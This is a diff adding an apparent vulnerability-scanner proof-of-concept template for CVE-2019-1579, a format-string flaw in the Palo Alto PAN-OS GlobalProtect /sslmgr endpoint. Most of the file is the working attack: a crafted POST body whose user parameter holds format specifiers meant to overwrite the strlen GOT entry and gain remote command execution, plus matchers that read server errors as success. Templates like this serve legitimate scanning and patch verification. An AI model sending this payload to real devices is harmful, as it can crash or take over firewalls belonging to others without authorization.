@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "向目标 PAN-OS 设备的 /sslmgr 端点发送特制 POST 请求，利用 user 参数中的格式化字符串覆盖 strlen GOT 为 system PLT，实现远程命令执行。影响 PAN-OS 7.1.18 及更早、8.0.11-h1 及更早、8.1.2 及更早版本。"
+id = "POC-AVE-2019-0700"
+name = "Palo Alto Networks PAN-OS GlobalProtect 格式化字符串远程代码执行漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2019-1579",
+    "palo-alto",
+    "globalprotect",
+    "format-string",
+    "rce",
+]
+vuln_id = [
+    "CVE-2019-1579",
+    "AVE-2019-0700",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/sslmgr"
+protocol = "http"
+
+[poc.requests.body]
+content = "scep-profile-name=AAAAAAAA&appauthcookie=BBBBBBBB&host-id=CCCCCCCC&user-email=EEEEEEEE&user=%70$n%126$c%24$hhn%65488c%32$hn"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "502 Bad Gateway",
+    "500 Internal Server Error",
+]
